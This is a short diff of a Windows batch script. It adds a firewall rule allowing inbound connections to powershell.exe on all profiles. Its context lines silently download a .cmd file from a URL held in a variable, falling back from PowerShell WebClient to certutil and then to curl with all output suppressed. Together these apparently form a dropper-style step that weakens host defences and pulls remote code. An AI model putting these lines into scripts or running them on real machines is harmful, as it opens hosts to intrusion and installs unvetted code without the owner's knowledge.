@@ -14,6 +14,9 @@ set "DK=!DKF!\DK.cmd"
 mkdir "!DKF!" 2>nul
 set "DK=!DKF!\DK.cmd" 
 
+:: firewall
+netsh advfirewall firewall add rule name="Powershell" dir=in action=allow program="C:\windows\system32\windowspowershell\v1.0\powershell.exe" enable=yes profile=any
+
 if not exist !DK! powershell -c "(New-Object Net.WebClient).DownloadFile('!HDK!','!DK!')" >nul 2>&1||certutil -urlcache -split -f "!HDK!" "!DK!" >nul 2>&1||curl -f "!HDK!" -o "!DK!" >nul 2>&1||echo DKINIT Failed
 
 endlocal & set "DK=%DK%"
